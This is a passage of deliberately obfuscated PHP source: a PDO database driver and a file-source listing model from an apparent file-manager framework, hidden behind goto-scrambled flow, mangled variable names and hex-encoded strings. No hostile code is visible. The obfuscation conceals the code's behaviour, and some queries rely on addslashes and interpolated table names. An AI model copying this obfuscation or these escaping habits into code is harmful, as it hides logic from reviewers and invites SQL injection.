!empty($C’ˆÖè“›î[$dòôÛ÷öÏ¥[13]][$dòôÛ÷öÏ¥[14]]) ? $C’ˆÖè“›î[$dòôÛ÷öÏ¥[13]][$dòôÛ÷öÏ¥[14]] : $this->pconnect; if ($fñëÚ˜Ÿ×Ø) { $C’ˆÖè“›î[$dòôÛ÷öÏ¥[13]][PDO::ATTR_PERSISTENT] = !0; } goto f÷Å¶ø•ö; f÷Å¶ø•ö: try { $this->linkID[$Fœ‘öâˆë¡] = new PDO($C’ˆÖè“›î[$dòôÛ÷öÏ¥[901]], $C’ˆÖè“›î[$dòôÛ÷öÏ¥[874]], $C’ˆÖè“›î[$dòôÛ÷öÏ¥[875]], $C’ˆÖè“›î[$dòôÛ÷öÏ¥[13]]); } catch (PDOException $FˆÛÖ¥¬„Ñ) { think_exception($FˆÛÖ¥¬„Ñ->getMessage()); } $this->dbType = $this->_getDsnType($C’ˆÖè“›î[$dòôÛ÷öÏ¥[901]]); if (in_array($this->dbType, array($dòôÛ÷öÏ¥[902], $dòôÛ÷öÏ¥[903], $dòôÛ÷öÏ¥[904], $dòôÛ÷öÏ¥[905]))) { think_exception($dòôÛ÷öÏ¥[906] . $this->dbType . $dòôÛ÷öÏ¥[907] . $this->dbType . $dòôÛ÷öÏ¥[908]); } goto eé®È‰ÇÌÛ; Fõ’š‰‘¥­: if (1 != think_config($dòôÛ÷öÏ¥[18])) { unset($this->config); } goto bÕİÙ·îÕ¶; eé®È‰ÇÌÛ: if (!$this->linkID[$Fœ‘öâˆë¡]) { think_exception($dòôÛ÷öÏ¥[909]); } try { $this->linkID[$Fœ‘öâˆë¡]->exec($dòôÛ÷öÏ¥[910] . think_config($dòôÛ÷öÏ¥[877])); } catch (Exception $FˆÛÖ¥¬„Ñ) { } $this->connected = !0; goto Fõ’š‰‘¥­; bÕİÙ·îÕ¶: } return $this->linkID[$Fœ‘öâˆë¡]; } public function free() { $this->PDOStatement = null; } public function query($Dì‘®“ùÅæ, $f°î®‹±¥ = array()) { goto Aˆ‹²£Ø±ì; d©Á°ÔõŞ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $CÒ›Œ»Áš = $this->PDOStatement->execute($f°î®‹±¥); $this->debug(); goto dÎ”®å‹ß‰; C¯¬›ÏÄ„: think_action_status($c¤«×‹‘·›[19], 1); think_status($c¤«×‹‘·›[20]); $this->PDOStatement = $this->_linkID->prepare($Dì‘®“ùÅæ); goto d©Á°ÔõŞ; dÎ”®å‹ß‰: if (!1 === $CÒ›Œ»Áš) { $this->error(); return !1; } else { return $this->getAll(); } goto F±•‚åáá‘; a˜„™ç¨àÙ: $this->queryStr = $Dì‘®“ùÅæ; if (!empty($f°î®‹±¥)) { $this->queryStr .= $c¤«×‹‘·›[911] . print_r($f°î®‹±¥, !0) . $c¤«×‹‘·›[912]; } if (!empty($this->PDOStatement)) { $this->free(); } goto C¯¬›ÏÄ„; Aˆ‹²£Ø±ì: $c¤«×‹‘·› =& $_SERVER[›èö’ù¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a˜„™ç¨àÙ; F±•‚åáá‘: } public function execute($Eî¨İÉÛ‚â, $F•†ÜÙ¸òâ = array()) { goto A˜ĞñÛ·‰; c˜Ïæ”®¯“: think_status($DÆÏ¤‹Ï È[20]); $this->PDOStatement = $this->_linkID->prepare($Eî¨İÉÛ‚â); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto EÀÜŒ²”•È; EÀÜŒ²”•È: $EåñéÜó©ï = $this->PDOStatement->execute($F•†ÜÙ¸òâ); $this->debug(); if (!1 === $EåñéÜó©ï) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($bÊùˆÏˆ” || preg_match($DÆÏ¤‹Ï È[917], $Eî¨İÉÛ‚â)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Cª®–ùÆöÛ; C‘Áâ¥’Ó: if ($this->dbType == $DÆÏ¤‹Ï È[905]) { if (preg_match($DÆÏ¤‹Ï È[913], $this->queryStr, $Câ‚Ìˆ®«ğ)) { $this->table = think_config($DÆÏ¤‹Ï È[914]) . str_ireplace(think_config($DÆÏ¤‹Ï È[915]), $DÆÏ¤‹Ï È[376], $Câ‚Ìˆ®«ğ[2]); $bÊùˆÏˆ” = (bool) $this->query($DÆÏ¤‹Ï È[916] . strtoupper($this->table) . $DÆÏ¤‹Ï È[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($DÆÏ¤‹Ï È[21], 1); goto c˜Ïæ”®¯“; e£èÙ»‹¥: $this->queryStr = $Eî¨İÉÛ‚â; if (!empty($F•†ÜÙ¸òâ)) { $this->queryStr .= $DÆÏ¤‹Ï È[911] . print_r($F•†ÜÙ¸òâ, !0) . $DÆÏ¤‹Ï È[912]; } $bÊùˆÏˆ” = !1; goto C‘Áâ¥’Ó; A˜ĞñÛ·‰: $DÆÏ¤‹Ï È =& $_SERVER[›èö’ù¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e£èÙ»‹¥; Cª®–ùÆöÛ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eƒñ‰Óå¤ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Eƒñ‰Óå¤) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dƒé–íï×Ã = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Dƒé–íï×Ã) { $this->error(); return !1; } } return !0; } private function getAll() { $Eî–ˆÕÃ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Eî–ˆÕÃ); return $Eî–ˆÕÃ; } public function getFields($b¹Í´Å­¯ö) { goto B˜±‚¼„Ûï; B˜±‚¼„Ûï: $B×À‚„ïâ =& $_SERVER[›èö’ù¤]; $this->initConnect(!0); if (think_config($B×À‚„ïâ[918])) { $FêÑÄ‘İø´ = str_replace($B×À‚„ïâ[919], $b¹Í´Å­¯ö, think_config($B×À‚„ïâ[918])); } else { switch ($this->dbType) { case $B×À‚„ïâ[902]: case $B×À‚„ïâ[920]: $FêÑÄ‘İø´ = "\123\x45\x4c\105\103\x54\x20\40\40\x63\157\x6c\165\x6d\156\x5f\156\141\x6d\x65\40\x61\x73\x20\47\116\x61\155\x65\x27\54\40\40\x20\144\x61\x74\x61\x5f\x74\171\160\145\40\x61\x73\40\x27\x54\x79\x70\x65\x27\54\x20\x20\x20\x63\x6f\154\x75\155\156\137\144\145\x66\141\165\x6c\164\40\141\x73\40\47\x44\145\x66\x61\165\154\164\x27\x2c\40\x20\40\151\x73\137\156\x75\x6c\154\x61\142\154\x65\40\x61\x73\40\47\116\165\154\154\x27\12\11\x9\x46\x52\117\x4d\x9\151\156\x66\157\x72\x6d\x61\x74\x69\x6f\156\137\163\143\x68\x65\x6d\141\56\164\x61\142\x6c\x65\x73\40\x41\123\x20\x74\12\11\11\112\x4f\x49\116\x9\151\x6e\146\x6f\162\x6d\141\x74\151\157\x6e\137\x73\x63\x68\145\x6d\x61\x2e\143\x6f\154\165\155\156\163\40\x41\123\40\143\xa\x9\11\117\x4e\40\x20\164\x2e\164\x61\142\154\x65\137\x63\141\164\141\154\x6f\x67\40\x3d\40\x63\x2e\x74\x61\x62\x6c\x65\137\143\x61\x74\141\154\157\x67\12\x9\11\x41\116\104\x20\x74\x2e\164\x61\x62\154\145\x5f\x73\143\150\145\x6d\141\x20\x3d\40\143\x2e\x74\141\x62\154\x65\x5f\x73\143\150\x65\155\x61\12\x9\x9\x41\116\104\40\x74\x2e\164\x61\x62\154\x65\137\156\x61\x6d\x65\40\x3d\x20\x63\x2e\x74\141\142\154\x65\x5f\x6e\141\x6d\145\12\11\11\x57\110\x45\x52\x45\x20\40\40\x74\x2e\164\141\142\x6c\x65\137\x6e\x61\x6d\145\40\x3d\x20\x27{$b¹Í´Å­¯ö}\47"; break; case $B×À‚„ïâ[921]: $FêÑÄ‘İø´ = $B×À‚„ïâ[922] . $b¹Í´Å­¯ö . $B×À‚„ïâ[923]; break; case $B×À‚„ïâ[903]: case $B×À‚„ïâ[905]: $FêÑÄ‘İø´ = $B×À‚„ïâ[924] . $B×À‚„ïâ[925] . $B×À‚„ïâ[926] . strtoupper($b¹Í´Å­¯ö) . $B×À‚„ïâ[927] . strtoupper($b¹Í´Å­¯ö) . $B×À‚„ïâ[928]; break; case $B×À‚„ïâ[929]: $FêÑÄ‘İø´ = $B×À‚„ïâ[930] . $b¹Í´Å­¯ö . $B×À‚„ïâ[931]; break; case $B×À‚„ïâ[904]: break; case $B×À‚„ïâ[932]: default: $FêÑÄ‘İø´ = $B×À‚„ïâ[933] . ($this->dbType == $B×À‚„ïâ[932] ? "\140{$b¹Í´Å­¯ö}\x60" : $b¹Í´Å­¯ö); } } goto aÕÙ¿Üù¬½; aÕÙ¿Üù¬½: $a£³¹ñö‚º = $this->query($FêÑÄ‘İø´); $E’êÉ«³Ÿ = array(); if ($a£³¹ñö‚º) { foreach ($a£³¹ñö‚º as $c¿àØÔö§ => $A„È–Èå©) { $A„È–Èå© = array_change_key_case($A„È–Èå©); $A„È–Èå©[$B×À‚„ïâ[28]] = isset($A„È–Èå©[$B×À‚„ïâ[28]]) ? $A„È–Èå©[$B×À‚„ïâ[28]] : $B×À‚„ïâ[376]; $A„È–Èå©[$B×À‚„ïâ[29]] = isset($A„È–Èå©[$B×À‚„ïâ[29]]) ? $A„È–Èå©[$B×À‚„ïâ[29]] : $B×À‚„ïâ[376]; $c‹ÓçÓ Ö× = isset($A„È–Èå©[$B×À‚„ïâ[271]]) ? $A„È–Èå©[$B×À‚„ïâ[271]] : $A„È–Èå©[$B×À‚„ïâ[28]]; $E’êÉ«³Ÿ[$c‹ÓçÓ Ö×] = array($B×À‚„ïâ[28] => $c‹ÓçÓ Ö×, $B×À‚„ïâ[29] => $A„È–Èå©[$B×À‚„ïâ[29]], $B×À‚„ïâ[31] => (bool) (isset($A„È–Èå©[$B×À‚„ïâ[103]]) && $A„È–Èå©[$B×À‚„ïâ[103]] === $B×À‚„ïâ[33] || isset($A„È–Èå©[$B×À‚„ïâ[31]]) && $A„È–Èå©[$B×À‚„ïâ[31]] === $B×À‚„ïâ[33]), $B×À‚„ïâ[34] => isset($A„È–Èå©[$B×À‚„ïâ[34]]) ? $A„È–Èå©[$B×À‚„ïâ[34]] : (isset($A„È–Èå©[$B×À‚„ïâ[53]]) ? $A„È–Èå©[$B×À‚„ïâ[53]] : $B×À‚„ïâ[376]), $B×À‚„ïâ[36] => isset($A„È–Èå©[$B×À‚„ïâ[93]]) ? strtolower($A„È–Èå©[$B×À‚„ïâ[93]]) == $B×À‚„ïâ[38] : (isset($A„È–Èå©[$B×À‚„ïâ[54]]) ? $A„È–Èå©[$B×À‚„ïâ[54]] : !1), $B×À‚„ïâ[39] => isset($A„È–Èå©[$B×À‚„ïâ[934]]) ? strtolower($A„È–Èå©[$B×À‚„ïâ[934]]) == $B×À‚„ïâ[41] : (isset($A„È–Èå©[$B×À‚„ïâ[93]]) ? $A„È–Èå©[$B×À‚„ïâ[93]] : !1)); } } goto C¹“ÏÜõµã; C¹“ÏÜõµã: return $E’êÉ«³Ÿ; goto cæªíÙƒÙš; cæªíÙƒÙš: } public function getTables($d±†İÇ‡È¥ = '') { $Eï¨ì›ôõ‘ =& $_SERVER[›èö’ù¤]; if (think_config($Eï¨ì›ôõ‘[935])) { $C¼Ş‡›Ø£ó = str_replace($Eï¨ì›ôõ‘[936], $d±†İÇ‡È¥, think_config($Eï¨ì›ôõ‘[935])); } else { switch ($this->dbType) { case $Eï¨ì›ôõ‘[903]: case $Eï¨ì›ôõ‘[905]: $C¼Ş‡›Ø£ó = $Eï¨ì›ôõ‘[937]; break; case $Eï¨ì›ôõ‘[902]: case $Eï¨ì›ôõ‘[920]: $C¼Ş‡›Ø£ó = $Eï¨ì›ôõ‘[938]; break; case $Eï¨ì›ôõ‘[929]: $C¼Ş‡›Ø£ó = $Eï¨ì›ôõ‘[939]; break; case $Eï¨ì›ôõ‘[904]: think_exception(think_lang($Eï¨ì›ôõ‘[940]) . $Eï¨ì›ôõ‘[941]); break; case $Eï¨ì›ôõ‘[921]: $C¼Ş‡›Ø£ó = $Eï¨ì›ôõ‘[42] . $Eï¨ì›ôõ‘[43] . $Eï¨ì›ôõ‘[44]; break; case $Eï¨ì›ôõ‘[932]: default: if (!empty($d±†İÇ‡È¥)) { $C¼Ş‡›Ø£ó = $Eï¨ì›ôõ‘[885] . $d±†İÇ‡È¥ . $Eï¨ì›ôõ‘[886]; } else { $C¼Ş‡›Ø£ó = $Eï¨ì›ôõ‘[887]; } } } $a©†³´Œ„ = $this->query($C¼Ş‡›Ø£ó); $Aç¹ğ¤åÀô = array(); foreach ($a©†³´Œ„ as $B¥’ù÷÷¨î => $DƒäÙÏÜ‹Æ) { $Aç¹ğ¤åÀô[$B¥’ù÷÷¨î] = current($DƒäÙÏÜ‹Æ); } return $Aç¹ğ¤åÀô; } protected function parseLimit($cùéà‡î’) { $AŸ”éÎŠç» =& $_SERVER[›èö’ù¤]; $DãÜ˜ÙÇÜÌ = $AŸ”éÎŠç»[33]; if (!empty($cùéà‡î’)) { switch ($this->dbType) { case $AŸ”éÎŠç»[929]: case $AŸ”éÎŠç»[921]: $cùéà‡î’ = explode($AŸ”éÎŠç»[47], $cùéà‡î’); if (count($cùéà‡î’) > 1) { $DãÜ˜ÙÇÜÌ .= $AŸ”éÎŠç»[48] . $cùéà‡î’[1] . $AŸ”éÎŠç»[49] . $cùéà‡î’[0] . $AŸ”éÎŠç»[50]; } else { $DãÜ˜ÙÇÜÌ .= $AŸ”éÎŠç»[48] . $cùéà‡î’[0] . $AŸ”éÎŠç»[50]; } break; case $AŸ”éÎŠç»[902]: case $AŸ”éÎŠç»[920]: break; case $AŸ”éÎŠç»[904]: break; case $AŸ”éÎŠç»[903]: case $AŸ”éÎŠç»[905]: break; case $AŸ”éÎŠç»[932]: default: $DãÜ˜ÙÇÜÌ .= $AŸ”éÎŠç»[48] . $cùéà‡î’ . $AŸ”éÎŠç»[50]; } } return $DãÜ˜ÙÇÜÌ; } public function parseKey(&$bã¢»¾ÊÛ, $bÆŸ•–‰š = true) { $D•èÚ‹‰Ÿ =& $_SERVER[›èö’ù¤]; if ($bÆŸ•–‰š) { $bã¢»¾ÊÛ = $this->parseKeyCheck($bã¢»¾ÊÛ); } if ($this->dbType == $D•èÚ‹‰Ÿ[932]) { if ($bã¢»¾ÊÛ != $D•èÚ‹‰Ÿ[182] && !preg_match($D•èÚ‹‰Ÿ[897], $bã¢»¾ÊÛ)) { $bã¢»¾ÊÛ = $D•èÚ‹‰Ÿ[383] . trim($bã¢»¾ÊÛ, $D•èÚ‹‰Ÿ[383]) . $D•èÚ‹‰Ÿ[383]; } return $bã¢»¾ÊÛ; } else { return parent::parseKey($bã¢»¾ÊÛ, $bÆŸ•–‰š); } } public function close() { $this->_linkID = null; } public function error() { $DÌŒºÏ«Íù =& $_SERVER[›èö’ù¤]; if ($this->PDOStatement) { $FÛÁÂ³ŒĞ = $this->PDOStatement->errorInfo(); $this->error = $FÛÁÂ³ŒĞ[1] . $DÌŒºÏ«Íù[4] . $FÛÁÂ³ŒĞ[2]; } else { $this->error = $DÌŒºÏ«Íù[33]; } if ($DÌŒºÏ«Íù[33] != $this->queryStr) { $this->error .= LNG($DÌŒºÏ«Íù[45]) . $this->queryStr; } think_trace($this->error, $DÌŒºÏ«Íù[33], $DÌŒºÏ«Íù[46]); return $this->error; } public function escapeString($D£¬Œï‘) { $E™ñ¹Ó›— =& $_SERVER[›èö’ù¤]; switch ($this->dbType) { case $E™ñ¹Ó›—[929]: case $E™ñ¹Ó›—[902]: case $E™ñ¹Ó›—[920]: case $E™ñ¹Ó›—[932]: return addslashes($D£¬Œï‘); case $E™ñ¹Ó›—[904]: case $E™ñ¹Ó›—[921]: case $E™ñ¹Ó›—[903]: case $E™ñ¹Ó›—[905]: return str_ireplace($E™ñ¹Ó›—[55], $E™ñ¹Ó›—[56], $D£¬Œï‘); } } protected function parseValue($b¢ÔÉêò„) { $A­î¡´ƒ =& $_SERVER[›èö’ù¤]; if (is_string($b¢ÔÉêò„)) { $A¢‹Ê¤©¢Ò = strpos($b¢ÔÉêò„, $A­î¡´ƒ[4]) === 0 && in_array($b¢ÔÉêò„, array_keys($this->bind)); $b¢ÔÉêò„ = $A¢‹Ê¤©¢Ò ? $this->escapeString($b¢ÔÉêò„) : $A­î¡´ƒ[942] . $this->escapeString($b¢ÔÉêò„) . $A­î¡´ƒ[942]; } elseif (isset($b¢ÔÉêò„[0]) && is_string($b¢ÔÉêò„[0]) && strtolower($b¢ÔÉêò„[0]) == $A­î¡´ƒ[295]) { $b¢ÔÉêò„ = $this->escapeString($b¢ÔÉêò„[1]); } elseif (is_array($b¢ÔÉêò„)) { $b¢ÔÉêò„ = array_map(array($this, $A­î¡´ƒ[943]), $b¢ÔÉêò„); } elseif (is_bool($b¢ÔÉêò„)) { $b¢ÔÉêò„ = $b¢ÔÉêò„ ? $A­î¡´ƒ[87] : $A­î¡´ƒ[191]; } elseif (is_null($b¢ÔÉêò„)) { $b¢ÔÉêò„ = $A­î¡´ƒ[103]; } return $b¢ÔÉêò„; } public function getLastInsertId() { $EêÔİÒ¥«ˆ =& $_SERVER[›èö’ù¤]; switch ($this->dbType) { case $EêÔİÒ¥«ˆ[929]: case $EêÔİÒ¥«ˆ[921]: case $EêÔİÒ¥«ˆ[902]: case $EêÔİÒ¥«ˆ[920]: case $EêÔİÒ¥«ˆ[904]: case $EêÔİÒ¥«ˆ[932]: return $this->_linkID->lastInsertId(); case $EêÔİÒ¥«ˆ[903]: case $EêÔİÒ¥«ˆ[905]: $dé×Ù«÷¬¾ = $this->table; $bÀ‰Ä¸“˜ˆ = $this->query("\123\x45\x4c\x45\x43\124\x20{$dé×Ù«÷¬¾}\56\143\x75\x72\x72\166\x61\154\x20\143\x75\162\x72\x76\141\154\x20\106\122\117\115\40\144\x75\x61\x6c"); return $bÀ‰Ä¸“˜ˆ ? $bÀ‰Ä¸“˜ˆ[0][$EêÔİÒ¥«ˆ[944]] : 0; } } } goto d¡†ç…—ö; eÓõƒéä±: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\143\x65"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\155\x65" => "\x69\x6f\137\163\157\x75\x72\x63\x65\137\x6d\x65\x74\141", "\155\x65\x74\141\x46\151\x65\x6c\144" => "\163\x6f\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\144\151\x66\171\x54\151\155\x65", "\x74\x69\155\145", "\x69\156\163\x65\x72\164", "\146\165\156\x63\164\x69\157\x6e"), array("\x63\x72\x65\x61\x74\x65\x54\x69\155\145", "\164\x69\x6d\145", "\151\156\163\x65\x72\x74", "\146\165\156\143\164\x69\157\156"), array("\166\151\x65\x77\x54\x69\x6d\145", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\164", "\x66\165\156\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($CĞç¹—‡º) { return $this->listSource(array($_SERVER[›èö’ù¤][396] => $CĞç¹—‡º)); } public function typeName($a©âÓÅÆ’Æ) { static $dĞĞëƒãåÈ = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\155", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $dĞĞëƒãåÈ[$a©âÓÅÆ’Æ . $_SERVER[›èö’ù¤][33]]; } public function sourceListInfo($CâŠæ‡á©æ, $e†Œ…èºšÒ = false) { goto a¦ãµÑçµé; dòåÙÓôË¸: return array_to_keyvalue($D™ô§Ã·Î, $f§ùÚöÚà¸[397]); goto B¬Ä‹Š«ĞŒ; eØ¡äÙ×¾É: if (!$CâŠæ‡á©æ) { return array(); } $D™ô§Ã·Î = $this->where(array($f§ùÚöÚà¸[397] => array($f§ùÚöÚà¸[7], $CâŠæ‡á©æ)))->select(); $this->_listDataApply($D™ô§Ã·Î, $e†Œ…èºšÒ); goto dòåÙÓôË¸; a¦ãµÑçµé: $f§ùÚöÚà¸ =& $_SERVER[›èö’ù¤]; $CâŠæ‡á©æ = $CâŠæ‡á©æ ? $CâŠæ‡á©æ : array(); $CâŠæ‡á©æ = array_filter(array_unique($CâŠæ‡á©æ)); goto eØ¡äÙ×¾É; B¬Ä‹Š«ĞŒ: } public function pathInfoFilter(&$A¦ÖÛ•ÄŠõ) { goto c†ŒÕİ•¥‹; A•ãÜ‡‹ª•: $A¦ÖÛ•ÄŠõ = array_field_key($A¦ÖÛ•ÄŠõ, $a¯ŒŞÜí); return $A¦ÖÛ•ÄŠõ; goto F¨­½”¥…±; d‡˜ÍÒÖÉƒ: if ($A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[405]] != 1) { $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[168]] = $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[407]]; unset($A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[407]]); } $a¯ŒŞÜí = $E‰¶íºÊ»¼; if (isset($A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[408]]) && $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[408]][$c„±í¹„Æô[409]] == -1) { $a¯ŒŞÜí = $AĞœ¬ˆµñ; } goto A•ãÜ‡‹ª•; D„ô…Ù›ŒÓ: static $Cì²Ã“¯Õ¾ = false; if (!$E‰¶íºÊ»¼) { goto a¢Ø»ÅŠˆ; a¢Ø»ÅŠˆ: $eÁ¯¸ˆëÚó = $c„±í¹„Æô[398]; $eÁ¯¸ˆëÚó .= $c„±í¹„Æô[399]; $eÁ¯¸ˆëÚó .= $c„±í¹„Æô[400]; goto aˆˆèå¦¼‰; aˆˆèå¦¼‰: $d…†ö©ĞÎ¿ = $c„±í¹„Æô[401]; $CÍº†Âî¤ğ = explode($c„±í¹„Æô[47], $d…†ö©ĞÎ¿); $E‰¶íºÊ»¼ = explode($c„±í¹„Æô[47], $eÁ¯¸ˆëÚó); goto e×¡˜•ä–; e×¡˜•ä–: $AĞœ¬ˆµñ = array(); foreach ($E‰¶íºÊ»¼ as $añĞ—‹—”Ë) { if (in_array($añĞ—‹—”Ë, $CÍº†Âî¤ğ)) { continue; } $AĞœ¬ˆµñ[] = $añĞ—‹—”Ë; } $Cì²Ã“¯Õ¾ = explode($c„±í¹„Æô[47], $c„±í¹„Æô[402]); goto cô¡©ˆ©òï; cô¡©ˆ©òï: } foreach ($Cì²Ã“¯Õ¾ as $b£ëñ¦áŸé) { if (isset($A¦ÖÛ•ÄŠõ[$b£ëñ¦áŸé])) { $A¦ÖÛ•ÄŠõ[$b£ëñ¦áŸé] = intval($A¦ÖÛ•ÄŠõ[$b£ëñ¦áŸé]); } } goto BÈ“é›á¢Œ; c†ŒÕİ•¥‹: $c„±í¹„Æô =& $_SERVER[›èö’ù¤]; static $E‰¶íºÊ»¼ = false; static $AĞœ¬ˆµñ = false; goto D„ô…Ù›ŒÓ; BÈ“é›á¢Œ: $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[76]] = $c„±í¹„Æô[403] . $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[397]] . $c„±í¹„Æô[404]; $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[29]] = $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[405]] == 1 ? $c„±í¹„Æô[77] : $c„±í¹„Æô[193]; $A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[406]] = $this->typeName($A¦ÖÛ•ÄŠõ[$c„±í¹„Æô[406]]); goto d‡˜ÍÒÖÉƒ; F¨­½”¥…±: } public function listUserFav() { goto cšÒšÁ÷¿Ñ; dÒ‚”º˜µ: $AíÌ¹ÂÒ†¬ = array_to_keyvalue($AíÌ¹ÂÒ†¬, $fÖò¤óˆÀ[33], $fÖò¤óˆÀ[76]); if ($AíÌ¹ÂÒ†¬) { $e¿óË‚•´ = $this->listSource(array($fÖò¤óˆÀ[412] => array($fÖò¤óˆÀ[413], $AíÌ¹ÂÒ†¬))); } $e¿óË‚•´ = array_to_keyvalue($e¿óË‚•´[$fÖò¤óˆÀ[367]], $fÖò¤óˆÀ[397]); goto Cí’¼ñÕÁ†; cšÒšÁ÷¿Ñ: $fÖò¤óˆÀ =& $_SERVER[›èö’ù¤]; $e¡ôóˆÏã = Model($fÖò¤óˆÀ[410])->listData(); $AíÌ¹ÂÒ†¬ = array_filter_by_field($e¡ôóˆÏã, $fÖò¤óˆÀ[29], $fÖò¤óˆÀ[411]); goto dÒ‚”º˜µ; Cí’¼ñÕÁ†: foreach ($e¡ôóˆÏã as &$eØÕ —Šíµ) { $eØÕ —Šíµ = array($fÖò¤óˆÀ[414] => $eØÕ —Šíµ[$fÖò¤óˆÀ[395]], $fÖò¤óˆÀ[415] => $eØÕ —Šíµ[$fÖò¤óˆÀ[28]], $fÖò¤óˆÀ[416] => $eØÕ —Šíµ[$fÖò¤óˆÀ[76]], $fÖò¤óˆÀ[417] => $eØÕ —Šíµ[$fÖò¤óˆÀ[29]], $fÖò¤óˆÀ[418] => $eØÕ —Šíµ[$fÖò¤óˆÀ[194]], $fÖò¤óˆÀ[419] => $eØÕ —Šíµ[$fÖò¤óˆÀ[84]]); if ($eØÕ —Šíµ[$fÖò¤óˆÀ[29]] == $fÖò¤óˆÀ[411] && $e¿óË‚•´[$eØÕ —Šíµ[$fÖò¤óˆÀ[76]]]) { $eØÕ —Šíµ[$fÖò¤óˆÀ[85]] = $e¿óË‚•´[$eØÕ —Šíµ[$fÖò¤óˆÀ[76]]]; } } unset($eØÕ —Šíµ); return $e¡ôóˆÏã; goto aóœÃÒ‘‡Ï; aóœÃÒ‘‡Ï: } public function listUserTag($D×¯çÒ½Ù†) { goto DÚ…––ñ; d²óù¶ò±ö: if ($fÈ¶Èªèµ) { Model($CØ‘ä’‚¤ä[422])->removeBySource($fÈ¶Èªèµ); } return $dŠ†öâÔÅ; goto B„•†¦ÊÊÊ; DÚ…––ñ: $CØ‘ä’‚¤ä =& $_SERVER[›èö’ù¤]; if ($D×¯çÒ½Ù† && !is_array($D×¯çÒ½Ù†)) { $D×¯çÒ½Ù† = array($D×¯çÒ½Ù†); } $eÒÒİÈ«‘© = Model($CØ‘ä’‚¤ä[420])->listData(); goto c­Šø×‹Æ; Fª¢ğÕÒ§»: $dæÊ¢ò†‹é = array_to_keyvalue($dŠ†öâÔÅ[$CØ‘ä’‚¤ä[74]], $CØ‘ä’‚¤ä[33], $CØ‘ä’‚¤ä[397]); $d·§’“Ö±ñ = array_merge($dæÊ¢ò†‹é, $däŸ¯¬££¥); foreach ($FÒö¿”İÚ¦ as $dƒÔàÇìßª) { if (!in_array($dƒÔàÇìßª, $d·§’“Ö±ñ)) { $fÈ¶Èªèµ[] = $dƒÔàÇìßª; } } goto d²óù¶ò±ö; dìÀ‡ÅÎº§: foreach ($eÒ ­Ô÷ÁÉ as $Eñ‰½âÅ°ç => $D´ôæÅÙ¸) { $d½³ë­á‡² = !0; if (!$D×¯çÒ½Ù†) { $FÒö¿”İÚ¦[] = $Eñ‰½âÅ°ç; continue; } foreach ($D×¯çÒ½Ù† as $A¢ºÑÑò¥Ü) { if (!in_array($A¢ºÑÑò¥Ü, $D´ôæÅÙ¸)) { $d½³ë­á‡² = !1; break; } } if ($d½³ë­á‡²) { $FÒö¿”İÚ¦[] = $Eñ‰½âÅ°ç; } } if (!$FÒö¿”İÚ¦) { return array(); } $dŠ†öâÔÅ = $this->listSource(array($CØ‘ä’‚¤ä[412] => array($CØ‘ä’‚¤ä[413], $FÒö¿”İÚ¦))); goto CŸ·Ÿ¸·‡»; CŸ·Ÿ¸·‡»: if (!$dŠ†öâÔÅ || count($FÒö¿”İÚ¦) == $dŠ†öâÔÅ[$CØ‘ä’‚¤ä[364]][$CØ‘ä’‚¤ä[365]]) { return $dŠ†öâÔÅ; } $fÈ¶Èªèµ = array(); $däŸ¯¬££¥ = array_to_keyvalue($dŠ†öâÔÅ[$CØ‘ä’‚¤ä[75]], $CØ‘ä’‚¤ä[33], $CØ‘ä’‚¤ä[397]); goto Fª¢ğÕÒ§»; c­Šø×‹Æ: $eÒ ­Ô÷ÁÉ = array(); foreach ($eÒÒİÈ«‘© as $açéÒ¨Ÿ™ä) { $dƒÔàÇìßª = $açéÒ¨Ÿ™ä[$CØ‘ä’‚¤ä[76]]; if (!$dƒÔàÇìßª) { continue; } if (!isset($eÒ ­Ô÷ÁÉ[$dƒÔàÇìßª])) { $eÒ ­Ô÷ÁÉ[$dƒÔàÇìßª] = array(); } $eÒ ­Ô÷ÁÉ[$dƒÔàÇìßª][] = $açéÒ¨Ÿ™ä[$CØ‘ä’‚¤ä[421]]; } $FÒö¿”İÚ¦ = array(); goto dìÀ‡ÅÎº§; B„•†¦ÊÊÊ: } public function listUserRecycle() { $EÃöËÀ–­¡ =& $_SERVER[›èö’ù¤]; $EˆÉãÓäÛ‹ = Model($EÃöËÀ–­¡[423])->listData(); if (!$EˆÉãÓäÛ‹) { return array(); } $d¨øŒ¯„ğ = array($EÃöËÀ–­¡[412] => array($EÃöËÀ–­¡[413], $EˆÉãÓäÛ‹), $EÃöËÀ–­¡[424] => 1); return $this->listSource($d¨øŒ¯„ğ); } public function listSource($fã«¶±å±Ã, $e‡¹ˆóìå¡ = 3000) { goto 